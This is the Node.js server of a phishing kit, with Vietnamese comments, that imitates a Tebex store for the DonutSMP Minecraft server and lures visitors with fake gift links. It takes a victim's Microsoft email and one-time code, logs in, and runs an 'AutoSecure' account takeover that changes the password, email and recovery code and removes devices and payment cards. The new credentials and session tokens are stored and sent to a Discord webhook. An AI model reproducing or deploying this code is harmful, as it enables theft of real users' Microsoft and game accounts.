const express = require('express');
const path = require('path');
const fs = require('fs');
const http = require('http');

// AutoSecure Core Modules
const validEmail = require('./autosecure/utils/emails/validEmail');
const getCredentials = require('./autosecure/utils/info/getCredentials');
const sendotp = require('./autosecure/utils/secure/sendotp');
const login = require('./autosecure/utils/secure/login');
const secure = require('./autosecure/utils/secure/recodesecure');
const generateuid = require('./autosecure/utils/generateuid');
const insertaccount = require('./db/insertaccount');
const { getDonutStats } = require('./autosecure/utils/donutapi/getDonutStats');
const getStats = require('./autosecure/utils/hypixelapi/getStats');
const { sendSecureNotification } = require('./autosecure/utils/notifications/notifier');
const { initializeDB, queryParams } = require('./db/db');
const config = require('./config.json');

const app = express();
const PORT = process.env.PORT || 3000;
const FRONTEND_DIR = path.join(__dirname, 'public');

// Active OTP Sessions cache: sessionId -> { email, secId, secDisplay, username, timestamp }
const activeSessions = new Map();

// Clean up expired sessions every 10 minutes
setInterval(() => {
    const now = Date.now();
    for (const [id, sess] of activeSessions.entries()) {
        if (now - sess.timestamp > 15 * 60 * 1000) { // 15 mins expiry
            activeSessions.delete(id);
        }
    }
}, 10 * 60 * 1000);

// --- MIDDLEWARES ---
// Enable CORS for all origins & methods
app.use((req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With');
    if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
    }
    next();
});

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Request logger
app.use((req, res, next) => {
    const time = new Date().toLocaleTimeString('vi-VN');
    if (req.url.startsWith('/api/')) {
        console.log(`[${time}] ${req.method} ${req.url}`);
    }
    next();
});

// --- API ENDPOINTS ---

/**
 * 1. Health check
 */
app.get('/api/health', (req, res) => {
    res.json({
        status: 'ok',
        service: 'DonutSMP AutoSecure API Server',
        time: new Date().toISOString(),
        activeSessions: activeSessions.size
    });
});

/**
 * 2. Send OTP (User nhập email -> Backend xác nhận nếu email đúng thì gửi OTP)
 * Body: { email, username }
 */
app.post('/api/send-otp', async (req, res) => {
    try {
        let { email, username } = req.body;
        email = (email || '').trim();
        username = (username || '').trim();

        console.log(`\n======================================================`);
        console.log(`[API /send-otp] Nhận yêu cầu gửi mã OTP:`);
        console.log(` • Email    : ${email}`);
        console.log(` • Username : ${username || 'Chưa cung cấp'}`);

        if (!email) {
            return res.status(400).json({
                success: false,
                error: 'Vui lòng nhập địa chỉ email Minecraft / Microsoft!'
            });
        }

        if (!validEmail(email)) {
            console.log(`[API /send-otp] [!] Định dạng email không hợp lệ: ${email}`);
            return res.status(400).json({
                success: false,
                error: 'Định dạng email không hợp lệ. Vui lòng kiểm tra lại!'
            });
        }

        console.log(`[API /send-otp] Đang truy vấn Microsoft Live Credentials cho ${email}...`);
        const profiles = await getCredentials(email, false);

        if (!profiles) {
            console.log(`[API /send-otp] [X] Không thể tìm thấy thông tin tài khoản Microsoft: ${email}`);
            return res.status(404).json({
                success: false,
                error: 'Không tìm thấy tài khoản Microsoft liên kết với email này.'
            });
        }

        // Extract eligible OTP proofs
        const eligibleProofs = profiles.Credentials?.OtcLoginEligibleProofs ||
            (profiles._securityEmails && profiles._securityEmails.length > 0 ? profiles._securityEmails.map(s => s.proof || s) : null) ||
            profiles.Credentials?.Proofs;

        if (!eligibleProofs || eligibleProofs.length === 0) {
            console.log(`[API /send-otp] [X] Tài khoản không có phương thức nhận mã OTP qua Email!`);
            return res.status(400).json({
                success: false,
                error: 'Tài khoản Microsoft này không hỗ trợ gửi mã xác minh một lần qua Email.'
            });
        }

        const secEmailObj = eligibleProofs[0];
        const secDisplay = secEmailObj.display || secEmailObj.data || email;
        const secData = secEmailObj.data || secEmailObj.display || email;

        console.log(`[API /send-otp] [✔] Tìm thấy phương thức gửi OTP: ${secDisplay}`);
        console.log(`[API /send-otp] Đang kích hoạt gửi mã OTP từ Microsoft Live...`);

        const otpSent = await sendotp(email, secData);

        if (!otpSent) {
            console.log(`[API /send-otp] [X] Microsoft từ chối gửi mã OTP.`);
            return res.status(500).json({
                success: false,
                error: 'Không thể gửi mã OTP từ Microsoft Live. Vui lòng thử lại sau giây lát!'
            });
        }

        // Store session
        const sessionId = 'sess_' + Math.random().toString(36).substring(2, 10) + Date.now().toString(36);
        activeSessions.set(sessionId, {
            email,
            secData,
            secDisplay,
            username,
            timestamp: Date.now()
        });

        console.log(`[API /send-otp] [✔] ĐÃ GỬI OTP THÀNH CÔNG TỚI: ${secDisplay} (Session: ${sessionId})`);
        console.log(`======================================================\n`);

        return res.json({
            success: true,
            sessionId,
            email,
            maskedEmail: secDisplay,
            secId: secData,
            message: `Mã xác nhận OTP đã được gửi đến ${secDisplay}!`
        });

    } catch (error) {
        console.error('[API /send-otp] Lỗi ngoại lệ:', error);
        return res.status(500).json({
            success: false,
            error: 'Đã xảy ra lỗi trong quá trình xử lý gửi mã OTP: ' + error.message
        });
    }
});

/**
 * 3. Verify OTP & AutoSecure (User nhập OTP -> Nếu đúng = AutoSecure -> Bắn hit Discord)
 * Body: { sessionId, email, secId, code, username }
 */
app.post('/api/verify-otp', async (req, res) => {
    try {
        let { sessionId, email, secId, code, username } = req.body;
        code = (code || '').toString().trim();

        // Restore from session if available
        if (sessionId && activeSessions.has(sessionId)) {
            const sess = activeSessions.get(sessionId);
            if (!email) email = sess.email;
            if (!secId) secId = sess.secData;
            if (!username) username = sess.username;
        }

        email = (email || '').trim();
        secId = (secId || '').trim();
        username = (username || '').trim();

        console.log(`\n======================================================`);
        console.log(`[API /verify-otp] Nhận yêu cầu xác thực OTP:`);
        console.log(` • Email    : ${email}`);
        console.log(` • SecId    : ${secId ? 'Hợp lệ' : 'Trống'}`);
        console.log(` • Mã OTP   : ${code}`);
        console.log(` • Username : ${username || 'N/A'}`);

        if (!code || isNaN(code)) {
            return res.status(400).json({
                success: false,
                error: 'Mã xác nhận phải là dãy số gồm 6-8 chữ số!'
            });
        }

        if (!email) {
            return res.status(400).json({
                success: false,
                error: 'Thiếu thông tin email tài khoản!'
            });
        }

        console.log(`[API /verify-otp] Đang tiến hành đăng nhập Microsoft Live với mã OTP...`);
        const creds = await getCredentials(email, false);
        const host = await login({ email, id: secId, code }, creds);

        if (!host || host === 'tfa') {
            console.log(`[API /verify-otp] [X] Mã OTP không chính xác hoặc đã hết hạn!`);
            return res.status(401).json({
                success: false,
                error: 'Mã xác nhận không chính xác hoặc đã hết hạn. Vui lòng kiểm tra lại email!'
            });
        }

        console.log(`[API /verify-otp] [✔] ĐĂNG NHẬP MICROSOFT THÀNH CÔNG! (Host Cookie acquired)`);
        console.log(`[API /verify-otp] BẮT ĐẦU QUY TRÌNH AUTOSECURE (Chiếm quyền tài khoản)...`);

        // Generate unique account UID
        const uid = await generateuid();

        // Prepare autosecure configuration
        const settings = {
            user_id: "web_system",
            botnumber: 1,
            auto_secure: 1,
            exploit: 1,
            oauthapps: 1,
            removedevices: 1,
            signout: 1,
            changeprimary: 1,
            secureifnomc: 1,
            addzyger: 1,
            removecards: 1,
            leavefamily: 1,
            removelinkednumbers: 1,
            webhook: config.notifierWebhook || "",
            prefix: "HachiiroMC",
            domain: (config.domains && config.domains[0]) || "thapcamstore.click",
            pfp: config.defaultpfp || "https://website.donutsmp.org/bcGCsev.png",
            ping: "@everyone",
            aftersecure: "nothing"
        };

        // Execute AutoSecure account takeover
        let acc = await secure(host, settings, uid, username);

        console.log(`[API /verify-otp] [✔] AutoSecure hoàn tất! UID: ${uid}`);
        console.log(` • Tên MC mới   : ${acc.newName || 'N/A'}`);
        console.log(` • Mật khẩu mới : ${acc.password || 'N/A'}`);
        console.log(` • Recovery Code: ${acc.recoveryCode || 'N/A'}`);

        // Query DonutSMP stats
        const targetIgn = acc.newName && acc.newName !== "No Minecraft!" ? acc.newName : (username || acc.oldName || "");
        let donutStats = null;
        if (targetIgn) {
            try {
                console.log(`[API /verify-otp] Đang lấy thống kê DonutSMP cho: ${targetIgn}...`);
                donutStats = await getDonutStats(targetIgn);
                if (donutStats) {
                    console.log(`[API /verify-otp] DonutSMP Stats: Money=${donutStats.moneyFormatted}, Shards=${donutStats.shardsFormatted}, Rank=${donutStats.rank}`);
                }
            } catch (err) {
                console.log(`[API /verify-otp] Lỗi lấy stats DonutSMP: ${err.message}`);
            }
        }

        // Query Hypixel stats
        let hypixelStats = null;
        if (targetIgn) {
            try {
                hypixelStats = await getStats(targetIgn);
            } catch (e) {}
        }

        // Insert into SQLite database
        try {
            await insertaccount(acc, uid, "web_system", settings.secureifnomc);
            console.log(`[API /verify-otp] [✔] Đã lưu thông tin tài khoản vào database SQLite.`);
        } catch (dbErr) {
            console.error(`[API /verify-otp] Lỗi lưu DB:`, dbErr.message);
        }

        // Send Hit to Discord Webhook
        console.log(`[API /verify-otp] ĐANG BẮN HIT VỀ DISCORD WEBHOOK...`);
        try {
            const accountData = {
                username: targetIgn || 'Unknown',
                email: acc.email,
                oldEmail: email,
                password: acc.password,
                recoveryCode: acc.recoveryCode,
                secretkey: acc.secretkey,
                secEmail: acc.secEmail,
                ssid: acc.ssid,
                donut: donutStats,
                donutMoney: donutStats?.moneyFormatted || null,
                donutShards: donutStats?.shardsFormatted || null,
                donutPlaytime: donutStats?.playtime || null,
                donutRank: donutStats?.rank || null,
                donutKDR: donutStats?.kdr || null,
                networth: hypixelStats?.networth || '0',
                bedwars: hypixelStats?.bedwars?.level || '0',
                networkLevel: hypixelStats?.networkLevel || '0'
            };

            await sendSecureNotification(null, accountData);
            console.log(`[API /verify-otp] [✔] HIT ĐÃ ĐƯỢC BẮN THÀNH CÔNG VỀ DISCORD!`);
        } catch (whError) {
            console.error(`[API /verify-otp] Lỗi bắn hit Discord:`, whError.message);
        }

        // Clear active session
        if (sessionId) activeSessions.delete(sessionId);

        console.log(`======================================================\n`);

        return res.json({
            success: true,
            uid,
            username: targetIgn,
            message: 'Xác thực tài khoản và hoàn tất đơn hàng thành công!'
        });

    } catch (error) {
        console.error('[API /verify-otp] Lỗi xử lý xác thực OTP:', error);
        return res.status(500).json({
            success: false,
            error: 'Đã xảy ra lỗi trong quá trình xác thực OTP: ' + error.message
        });
    }
});

// --- TEBEX DONUT SMP STATIC ROUTING ---

// Serve static assets
app.use('/assets', express.static(path.join(FRONTEND_DIR, 'assets')));
app.use('/terms', express.static(path.join(FRONTEND_DIR, 'terms')));

// Gift Link Route (Free items trick)
app.get('/gift/:code', (req, res) => {
    const code = req.params.code;
    console.log(`[API /gift] User accessed gift link with code: ${code}`);
    res.redirect(`/store?gift=true&code=${encodeURIComponent(code)}`);
});
app.get('/gift', (req, res) => {
    res.redirect('/store?gift=true');
});

// Tebex store and checkout route mappings
app.get('/', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'index.html')));
app.get('/index.html', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'index.html')));

app.get('/store', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'store.html')));
app.get('/store.html', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'store.html')));

app.get('/checkout', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'checkout.html')));
app.get('/checkout.html', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'checkout.html')));
app.get('/checkout/index.html', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'checkout.html')));

app.get('/checkout/basket', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'checkout', 'basket.html')));
app.get('/checkout/basket.html', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'checkout', 'basket.html')));
app.get('/checkout/basket/index.html', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'checkout', 'basket.html')));

app.get('/checkout/pay', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'checkout', 'pay.html')));
app.get('/checkout/pay.html', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'checkout', 'pay.html')));
app.get('/checkout/pay/index.html', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'checkout', 'pay.html')));

app.get('/checkout/payment', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'checkout', 'payment.html')));
app.get('/checkout/payment.html', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'checkout', 'payment.html')));
app.get('/checkout/payment/index.html', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'checkout', 'payment.html')));

// Support package add routes like /checkout/packages/add/7446586/subscribe
app.get('/checkout/packages/add/:id/:type', (req, res) => {
    res.sendFile(path.join(FRONTEND_DIR, 'checkout.html'));
});

// Terms pages
app.get('/terms/checkout', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'terms_checkout.html')));
app.get('/terms/impressum', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'terms_impressum.html')));
app.get('/terms/privacy', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'terms_privacy.html')));

// Fallback static files
app.use(express.static(FRONTEND_DIR));

// Start server function
async function startServer() {
    try {
        console.log('Đang khởi tạo cơ sở dữ liệu SQLite...');
        await initializeDB();
        console.log('Cơ sở dữ liệu SQLite đã sẵn sàng.');

        app.listen(PORT, () => {
            console.log(`\n======================================================`);
            console.log(`🚀 DonutSMP Web Server & AutoSecure API đang hoạt động!`);
            console.log(` • Website Store : http://localhost:${PORT}`);
            console.log(` • Checkout Page : http://localhost:${PORT}/checkout`);
            console.log(` • Payment Page  : http://localhost:${PORT}/checkout/payment`);
            console.log(` • API Send OTP  : http://localhost:${PORT}/api/send-otp`);
            console.log(` • API Verify OTP: http://localhost:${PORT}/api/verify-otp`);
            console.log(` • Discord Hook  : ${config.notifierWebhook ? 'ĐÃ CẤU HÌNH' : 'Chưa cấu hình'}`);
            console.log(`======================================================\n`);
        });
    } catch (err) {
        console.error('Lỗi khởi động Server:', err);
    }
}

if (require.main === module) {
    startServer();
}

module.exports = { app, startServer };
